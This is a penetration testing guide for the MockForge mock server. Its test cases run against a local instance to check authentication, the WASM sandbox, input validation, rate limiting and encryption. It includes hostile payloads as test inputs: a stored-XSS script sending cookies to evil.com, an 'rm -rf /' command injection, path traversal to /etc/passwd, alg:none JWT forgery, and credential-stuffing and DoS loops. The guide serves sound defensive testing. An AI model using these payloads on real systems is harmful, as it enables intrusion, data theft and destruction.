# MockForge Penetration Testing Guide

**Version:** 1.0
**Date:** 2025-10-09
**Purpose:** Security validation and vulnerability assessment

---

## Table of Contents

1. [Overview](#overview)
2. [Testing Environment Setup](#testing-environment-setup)
3. [Authentication Testing](#authentication-testing)
4. [WASM Sandbox Testing](#wasm-sandbox-testing)
5. [Input Validation Testing](#input-validation-testing)
6. [Network Security Testing](#network-security-testing)
7. [Encryption Testing](#encryption-testing)
8. [API Security Testing](#api-security-testing)
9. [Reporting](#reporting)
10. [Automated Testing](#automated-testing)

---

## Overview

This guide provides comprehensive penetration testing procedures for MockForge. It covers all critical security components and provides both manual and automated testing approaches.

### Scope

**In Scope:**
- Authentication and authorization mechanisms
- WASM plugin sandbox escape attempts
- Input validation and injection vulnerabilities
- Network security (TLS, rate limiting, CORS)
- Encryption and key management
- API endpoints security
- Admin UI security

**Out of Scope:**
- Infrastructure security (unless hosting MockForge)
- Third-party dependencies (covered by `cargo audit`)
- Physical security
- Social engineering

### Prerequisites

- MockForge running in test environment
- Testing tools installed (see [Testing Environment Setup](#testing-environment-setup))
- Basic understanding of web security
- Access credentials for test accounts

---

## Testing Environment Setup

### Required Tools

```bash
# Install testing tools
# HTTP testing
curl --version
wget --version

# Security scanners
cargo install cargo-audit
cargo install cargo-deny

# Fuzzing
cargo install cargo-fuzz

# Web security
npm install -g owasp-zap  # or download ZAP
pip install sqlmap

# Network tools
nmap --version
netcat -h

# TLS testing
testssl.sh --version
```

### Test Environment Configuration

```yaml
# config/test-security.yaml
server:
  host: 127.0.0.1
  port: 3000

admin:
  enabled: true
  auth_required: true
  username: "testadmin"
  password: "Test123!@#"

rate_limiting:
  enabled: true
  requests_per_minute: 10  # Low for testing
  burst: 20

wasm:
  sandbox_enabled: true
  max_memory_mb: 10
  max_executions: 100
  max_cpu_seconds: 5

encryption:
  algorithm: "aes-256-gcm"
  key_rotation_days: 1  # Short for testing
```

### Start Test Instance

```bash
# Start MockForge in test mode
MOCKFORGE_CONFIG=config/test-security.yaml \
MOCKFORGE_LOG_LEVEL=debug \
cargo run --release
```

---

## Authentication Testing

### 1. JWT Token Validation

#### Test Case: Expired Token
```bash
# Generate expired token (modify exp claim)
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDAwMDAwMDB9.xxx"

curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:3000/__mockforge/api/fixtures

# Expected: 401 Unauthorized
# Result: {"error": "Token expired"}
```

#### Test Case: Invalid Signature
```bash
# Tamper with token signature
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.TAMPERED"

curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:3000/__mockforge/api/fixtures

# Expected: 401 Unauthorized
# Result: {"error": "Invalid token signature"}
```

#### Test Case: Algorithm Confusion (None Algorithm)
```bash
# Try "none" algorithm bypass
TOKEN=$(echo -n '{"alg":"none","typ":"JWT"}' | base64).$(echo -n '{"user":"admin"}' | base64).

curl -H "Authorization: Bearer $TOKEN" \
     http://localhost:3000/__mockforge/api/fixtures

# Expected: 401 Unauthorized (algorithm not in allowed list)
# Result: {"error": "Invalid token"}
```

### 2. OAuth2 Token Introspection

#### Test Case: Token Introspection Endpoint DoS
```bash
# Attempt to overwhelm introspection endpoint
for i in {1..1000}; do
  curl -X POST http://localhost:3000/__mockforge/oauth2/introspect \
       -d "token=invalid_token_$i" &
done

# Expected: Rate limiting (429 Too Many Requests)
# Monitor: Server logs for rate limit denials
```

### 3. Admin UI Authentication

#### Test Case: Brute Force Protection
```bash
# Attempt multiple login attempts
for i in {1..100}; do
  curl -u "admin:wrongpass$i" \
       http://localhost:3000/__mockforge/api/fixtures
  sleep 0.1
done

# Expected: Rate limiting after N attempts
# Check: Response time increases, 429 responses
```

#### Test Case: Authorization Header Bypass
```bash
# Try various bypass techniques
curl http://localhost:3000/__mockforge/api/fixtures  # No auth
curl -H "Authorization: Basic" http://localhost:3000/__mockforge/api/fixtures  # Empty
curl -H "Authorization: Bearer admin:password" http://localhost:3000/__mockforge/api/fixtures  # Wrong scheme

# Expected: All return 401 Unauthorized
```

#### Test Case: Credential Stuffing
```bash
# Common credentials test
for cred in "admin:admin" "admin:password" "root:root" "admin:123456"; do
  echo "Testing: $cred"
  curl -u "$cred" http://localhost:3000/__mockforge/api/fixtures
done

# Expected: All fail (custom credentials required)
```

---

## WASM Sandbox Testing

### 1. Memory Exhaustion

#### Test Case: Allocate Beyond Limit
```rust
// wasm_memory_bomb.wat
(module
  (memory (export "memory") 1000)  ;; Request 1000 pages (64MB)
  (func (export "run")
    ;; Try to allocate more
    (drop (memory.grow 1000))
  )
)
```

```bash
# Compile and test
wat2wasm wasm_memory_bomb.wat -o memory_bomb.wasm

# Load as plugin
curl -X POST http://localhost:3000/__mockforge/api/plugins \
     -F "plugin=@memory_bomb.wasm"

# Expected: Plugin rejected or memory capped at 10MB limit
# Monitor: memory_tracker logs showing denial
```

### 2. Infinite Loop / CPU Exhaustion

#### Test Case: Infinite Loop
```rust
// infinite_loop.wat
(module
  (func (export "run")
    (loop $forever
      (br $forever)
    )
  )
)
```

```bash
# Test timeout mechanism
curl -X POST http://localhost:3000/__mockforge/api/plugins/run \
     -d '{"plugin": "infinite_loop"}' \
     --max-time 10

# Expected: Timeout after max_cpu_seconds (5s)
# Result: {"error": "Plugin execution timeout"}
```

### 3. Sandbox Escape Attempts

#### Test Case: Host Function Access
```rust
// Try to access restricted host functions
(module
  (import "env" "read_file" (func $read_file (param i32 i32) (result i32)))
  (func (export "run")
    ;; Attempt to read /etc/passwd
    (call $read_file (i32.const 0) (i32.const 100))
  )
)
```

```bash
# Expected: Import failure (function not exposed)
# Result: {"error": "Unknown import: env.read_file"}
```

#### Test Case: WASI Capability Violation
```rust
// Attempt filesystem access without capability
(module
  (import "wasi_snapshot_preview1" "path_open" (func $open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
  (func (export "run")
    ;; Try to open /etc/passwd
    (call $open ...)
  )
)
```

```bash
# Expected: Capability denied
# Result: {"error": "WASI capability violation: filesystem access not granted"}
```

---

## Input Validation Testing

### 1. XSS (Cross-Site Scripting)

#### Test Case: Admin UI Toast Injection
```bash
# Attempt script injection in toast messages
curl -X POST http://localhost:3000/__mockforge/api/toast \
     -H "Content-Type: application/json" \
     -d '{"title": "<script>alert(document.cookie)</script>", "message": "XSS attempt"}'

# Expected: Script tags escaped and displayed as text
# Verify: DOM shows &lt;script&gt; instead of <script>
```

#### Test Case: Stored XSS in Fixtures
```bash
# Inject XSS in fixture data
curl -X POST http://localhost:3000/__mockforge/api/fixtures \
     -H "Content-Type: application/json" \
     -d '{
       "name": "<img src=x onerror=\"alert(1)\">",
       "response": {"body": "<script>document.location=\"http://evil.com?c=\"+document.cookie</script>"}
     }'

# Expected: HTML escaped when displayed
# Verify: View fixture in UI, check for escaped characters
```

### 2. SQL Injection

#### Test Case: Fixture Name Injection
```bash
# SQL injection in query parameters
curl "http://localhost:3000/__mockforge/api/fixtures?name=test' OR '1'='1"

# Expected: Input sanitized, literal string search
# Result: Empty result or error, not all fixtures
```

### 3. Path Traversal

#### Test Case: File Upload Path Traversal
```bash
# Attempt directory traversal in file paths
curl -X POST http://localhost:3000/__mockforge/api/files \
     -F "file=@test.txt" \
     -F "path=../../../etc/passwd"

# Expected: 400 Bad Request
# Result: {"error": "Path traversal detected"}
```

#### Test Case: Static File Access
```bash
# Try to access files outside allowed directory
curl http://localhost:3000/__mockforge/static/../../etc/passwd

# Expected: 403 Forbidden or 404 Not Found
```

### 4. Command Injection

#### Test Case: Docker Compose Command Injection
```bash
# Inject commands in service names
curl -X POST http://localhost:3000/__mockforge/api/docker/compose \
     -d '{
       "services": {
         "test; rm -rf /": {
           "image": "nginx"
         }
       }
     }'

# Expected: 400 Bad Request
# Result: {"error": "Command argument contains dangerous character: ';'"}
```

### 5. Header Injection

#### Test Case: CRLF Injection
```bash
# Inject headers via CRLF
curl http://localhost:3000/__mockforge/api/test \
     -H "X-Custom: value\r\nX-Injected: malicious"

# Expected: CRLF characters stripped
# Verify: Server logs show sanitized header value
```

---

## Network Security Testing

### 1. TLS/SSL Testing

#### Test Case: Weak Cipher Suites
```bash
# Test for weak ciphers
testssl.sh --vulnerable localhost:3000

# Expected: No vulnerable ciphers (SSLv2, SSLv3, TLS 1.0, 1.1)
# Check: Only TLS 1.2+ with strong ciphers
```

#### Test Case: Certificate Validation
```bash
# Self-signed certificate test
openssl s_client -connect localhost:3000 -showcerts

# Expected: Valid certificate chain (if using TLS)
# Check: No certificate errors in production
```

### 2. Rate Limiting

#### Test Case: Burst Limit
```bash
# Test burst capacity (configured as 20)
for i in {1..25}; do
  echo "Request $i"
  curl -w "%{http_code}\n" http://localhost:3000/__mockforge/api/fixtures
done

# Expected:
# - Requests 1-20: 200 OK (burst allowed)
# - Requests 21-25: 429 Too Many Requests
```

#### Test Case: Sustained Rate
```bash
# Test sustained rate (10/min = ~6s per request)
for i in {1..15}; do
  echo "Request $i at $(date +%T)"
  curl -w "%{http_code}\n" http://localhost:3000/__mockforge/api/fixtures
  sleep 5
done

# Expected: After burst, limited to 10/min
# Monitor: Some 429 responses after burst depleted
```

#### Test Case: Per-IP Isolation
```bash
# Test from different IPs (using proxies or multiple interfaces)
curl --interface eth0 http://localhost:3000/api/test  # IP 1
curl --interface eth1 http://localhost:3000/api/test  # IP 2

# Expected: Separate rate limit buckets per IP
```

### 3. CORS (Cross-Origin Resource Sharing)

#### Test Case: Unauthorized Origin
```bash
# Request from disallowed origin
curl -H "Origin: http://evil.com" \
     -H "Access-Control-Request-Method: POST" \
     -X OPTIONS http://localhost:3000/__mockforge/api/fixtures

# Expected: CORS headers absent or origin rejected
# Result: No Access-Control-Allow-Origin: http://evil.com
```

---

## Encryption Testing

### 1. Key Strength Validation

#### Test Case: Weak Key Rejection
```bash
# Attempt to use weak encryption key
curl -X POST http://localhost:3000/__mockforge/api/encryption/key \
     -d '{"key": "0000000000000000000000000000000000000000000000000000000000000000"}'

# Expected: 400 Bad Request
# Result: {"error": "Key cannot be all zeros"}
```

### 2. Key Rotation Testing

#### Test Case: Decrypt Old Data After Rotation
```bash
# 1. Encrypt data with key v1
DATA=$(curl -X POST http://localhost:3000/__mockforge/api/encrypt \
       -d '{"plaintext": "secret"}' | jq -r '.encrypted')

# 2. Trigger key rotation
curl -X POST http://localhost:3000/__mockforge/api/encryption/rotate

# 3. Decrypt old data (should still work with v1 key)
curl -X POST http://localhost:3000/__mockforge/api/decrypt \
     -d "{\"encrypted\": \"$DATA\"}"

# Expected: 200 OK, decryption succeeds with old key
# Result: {"plaintext": "secret", "key_version": "v1"}
```

### 3. Encryption Algorithm Testing

#### Test Case: Nonce Uniqueness
```bash
# Encrypt same plaintext multiple times
for i in {1..10}; do
  curl -X POST http://localhost:3000/__mockforge/api/encrypt \
       -d '{"plaintext": "test"}' \
       | jq -r '.nonce'
done | sort | uniq -d

# Expected: No duplicates (empty output)
# Result: All nonces unique
```

---

## API Security Testing

### 1. OpenAPI Schema Validation

#### Test Case: Request Validation Bypass
```bash
# Send request violating schema
curl -X POST http://localhost:3000/api/users \
     -H "Content-Type: application/json" \
     -d '{"age": "not_a_number", "email": "invalid"}'

# Expected: 400 Bad Request with validation errors
# Result: {"errors": ["age must be integer", "email format invalid"]}
```

### 2. Mass Assignment

#### Test Case: Privilege Escalation via Mass Assignment
```bash
# Attempt to set admin flag
curl -X POST http://localhost:3000/api/users \
     -d '{"username": "attacker", "is_admin": true}'

# Expected: is_admin ignored or error
# Result: User created without admin privileges
```

### 3. IDOR (Insecure Direct Object References)

#### Test Case: Access Other User's Data
```bash
# Get user ID from response
USER_ID=$(curl http://localhost:3000/api/users/me | jq -r '.id')

# Try to access other user's data
curl http://localhost:3000/api/users/$((USER_ID + 1))

# Expected: 403 Forbidden (if not authorized)
```

---

## Reporting

### Vulnerability Report Template

```markdown
## Vulnerability Report

**Severity:** [Critical/High/Medium/Low]
**Date Found:** YYYY-MM-DD
**Component:** [e.g., Admin UI, WASM Sandbox, API]

### Description
[Brief description of the vulnerability]

### Steps to Reproduce
1. Step 1
2. Step 2
3. Step 3

### Expected Behavior
[What should happen]

### Actual Behavior
[What actually happens]

### Impact
[Potential damage or exploitation scenario]

### Proof of Concept
```bash
# PoC code/commands
```

### Remediation
[Suggested fix]

### CVSS Score
**Base Score:** X.X
- Attack Vector: [Network/Adjacent/Local/Physical]
- Attack Complexity: [Low/High]
- Privileges Required: [None/Low/High]
- User Interaction: [None/Required]
- Scope: [Unchanged/Changed]
- Confidentiality: [None/Low/High]
- Integrity: [None/Low/High]
- Availability: [None/Low/High]

### References
- Link to similar CVE
- Related documentation
```

### Severity Classification

| Severity | Criteria | SLA |
|----------|----------|-----|
| **Critical** | Remote code execution, authentication bypass, data breach | 24-48 hours |
| **High** | Privilege escalation, XSS, SQL injection | 1 week |
| **Medium** | Information disclosure, CSRF, weak crypto | 1 month |
| **Low** | Minor information leaks, configuration issues | Next release |

---

## Automated Testing

### Cargo Audit (Dependency Scanning)

```bash
# Run dependency audit
cargo audit

# Expected: No known vulnerabilities
# Action: Update dependencies if issues found
```

### Fuzzing with cargo-fuzz

```bash
# Initialize fuzzing target
cargo fuzz init

# Create fuzz target for input validation
cat > fuzz/fuzz_targets/validate_path.rs << 'EOF'
#![no_main]
use libfuzzer_sys::fuzz_target;
use mockforge_core::validation::validate_safe_path;

fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = validate_safe_path(s);
    }
});
EOF

# Run fuzzer
cargo fuzz run validate_path -- -max_total_time=300

# Expected: No panics or crashes
```

### OWASP ZAP Automated Scan

```bash
# Start ZAP in daemon mode
zap.sh -daemon -port 8090 -config api.key=your-api-key

# Run automated scan
zap-cli --api-key your-api-key quick-scan \
  --self-contained \
  --spider \
  -s all \
  http://localhost:3000

# Generate report
zap-cli --api-key your-api-key report -o zap-report.html -f html

# Review findings
```

### Integration Test Suite

```bash
# Run security-focused integration tests
cargo test --test security_integration -- --nocapture

# Tests include:
# - Authentication flows
# - Rate limiting
# - Input validation
# - WASM sandbox
```

### Continuous Security Testing

```yaml
# .github/workflows/security.yml
name: Security Tests

on:
  push:
    branches: [ main ]
  pull_request:
  schedule:
    - cron: '0 0 * * *'  # Daily

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions-rs/audit-check@v1
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/dependency-review-action@v3

  fuzz-testing:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run fuzzer
        run: |
          cargo install cargo-fuzz
          cargo fuzz run validate_path -- -max_total_time=60

  pentest-suite:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Start test server
        run: cargo run &
      - name: Run penetration tests
        run: ./scripts/run-pentests.sh
```

---

## Pre-Release Checklist

Before releasing to production:

- [ ] All critical vulnerabilities resolved
- [ ] Dependency audit clean (`cargo audit`)
- [ ] Fuzzing completed without crashes (300s+ runtime)
- [ ] Manual penetration tests passed
- [ ] OWASP ZAP scan reviewed
- [ ] TLS/SSL configuration verified
- [ ] Rate limiting tested and tuned
- [ ] Authentication flows validated
- [ ] WASM sandbox escape attempts failed
- [ ] Input validation comprehensive
- [ ] Encryption keys rotated
- [ ] Admin UI authentication enabled
- [ ] Security whitepaper up to date
- [ ] Incident response plan ready

---

## External Penetration Testing

For v1.x release, engage professional penetration testers:

### Recommended Firms
- **Cure53** (Germany) - WASM/crypto expertise
- **NCC Group** - Comprehensive security audits
- **Trail of Bits** - Rust/systems security
- **Bishop Fox** - Application security

### Engagement Scope
- 2-week assessment
- WASM sandbox focus
- API security testing
- Infrastructure review
- Remediation support

### Budget
- $20,000 - $40,000 for comprehensive audit
- $10,000 - $20,000 for focused assessment

---

## Contact

**Security Team:** security@mockforge.dev
**Emergency:** [Provided to registered users]
**Bug Bounty:** https://mockforge.dev/security/bounty

---

**Last Updated:** 2025-10-09
**Next Review:** 2025-11-09
**Version:** 1.0
